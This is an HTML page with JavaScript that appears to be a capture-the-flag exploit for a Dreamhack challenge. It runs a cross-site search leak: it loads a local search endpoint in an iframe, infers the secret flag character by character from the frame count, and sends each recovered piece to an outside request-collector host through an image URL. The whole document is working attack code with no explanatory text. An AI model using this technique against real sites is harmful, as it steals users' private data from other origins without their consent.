<iframe id="iframe"></iframe>
<img id="img">

<script>
async function searchChar(data) {
    return new Promise((resolve) => {
        iframe.src = "http://127.0.0.1:8000/search?query=" + data;
        iframe.onload = () => {
            resolve(iframe.contentWindow.frames.length > 0);
        };
    });
}

const iframe = document.getElementById("iframe");
const img = document.getElementById("img");
const chars = "0123456789abcdef}";
let flag = "DH{";

async function findFlag() {
    while (flag.length <= 35) {
        for (let i = 0; i < chars.length; i++) {
            if (await searchChar(flag + chars[i])) {
                flag += chars[i];
                img.src = "https://gcjbpbm.request.dreamhack.games?flag=" + flag;
                break;
            }
        }
    }
}

findFlag();
</script>
